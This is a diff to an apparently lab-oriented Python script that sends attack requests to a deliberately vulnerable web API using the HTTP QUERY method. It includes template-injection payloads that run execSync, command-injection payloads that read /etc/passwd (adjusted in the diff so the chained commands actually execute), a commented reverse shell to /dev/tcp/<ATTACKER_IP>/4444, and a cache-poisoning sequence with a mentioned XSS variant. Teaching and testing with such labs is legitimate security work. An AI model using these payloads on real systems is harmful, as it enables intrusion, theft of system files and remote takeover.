@@ -21,8 +21,10 @@ def send(method, path, body=None, show=True, timeout=30):
     return r
 
 # ------------------------------------------------ 0. method semantics
+# NOTE: uses /api/search/products (uncached) so it does NOT seed the
+#       catalog cache that section 6 relies on.
 banner("0. Method semantics: QUERY vs GET vs unknown methods")
-send("QUERY", "/api/search/catalog", {"q": "monitor", "page": 1})
+send("QUERY", "/api/search/products", {"q": "monitor", "page": 1})
 send("GET",   "/api/search/catalog")            # 405 + Allow: QUERY, OPTIONS
 send("OPTIONS", "/api/search/catalog")          # 204 + Allow header
 send("BREW",  "/api/search/catalog")            # unknown method
@@ -61,16 +63,26 @@ send("QUERY", "/api/render/email",
                   ".execSync('cat /app/data/products.txt | head -3').toString() %>"})
 
 # ------------------------------------------------ 5. command injection
+# FIXED: `</dev/null` gives the leading `grep` immediate EOF so the
+# chained commands actually execute (old payloads hung -> "exit": null).
 banner("5. OS command injection in QUERY body  (/api/export/report)")
-send("QUERY", "/api/export/report", {"grep": "monitor"})        # baseline
-send("QUERY", "/api/export/report", {"grep": 'x"; id #'})
-send("QUERY", "/api/export/report", {"grep": 'x"; cat /etc/passwd | head -5 #'})
-# reverse shell (lab only): {"grep": 'x"; bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1 #'}
+send("QUERY", "/api/export/report", {"grep": "monitor"})               # baseline
+send("QUERY", "/api/export/report", {"grep": 'x" </dev/null; id; #'})
+send("QUERY", "/api/export/report", {"grep": 'x" </dev/null; uname -a; #'})
+send("QUERY", "/api/export/report", {"grep": 'x" </dev/null; cat /etc/passwd | head -5; #'})
+# reverse shell variant (lab only):
+# {"grep": 'x" </dev/null; bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1; #'}
 
 # ------------------------------------------------ 6. cache poisoning
-banner("6. Body-blind cache poisoning (RFC 10008: cache key MUST include body)")
-send("QUERY", "/api/search/catalog", {"q": "monitor", "page": 1})   # cached: false
+# RFC 10008: QUERY responses are cacheable BUT the cache key MUST
+# include the request body. This cache keys on METHOD|PATH only ->
+# one slot for the whole endpoint -> first body wins, forever.
+banner("6. Body-blind cache poisoning (cache key ignores request body)")
+send("QUERY", "/api/search/catalog", {"q": "monitor", "page": 1})   # cached: false -> SEEDS slot
 send("QUERY", "/api/search/catalog", {"q": "keyboard", "page": 1})  # cached: true, monitor data!
-send("QUERY", "/api/search/catalog", {"q": "usb", "page": 1})       # still poisoned
+send("QUERY", "/api/search/catalog", {"q": "usb", "page": 1})       # cached: true, still poisoned
+# attacker-controlled variant (real-world): seed with a body whose
+# response embeds attacker content (XSS gadget), then every user of
+# the endpoint receives it until expiry.
 
 print(f"\n{G}done.{X}")
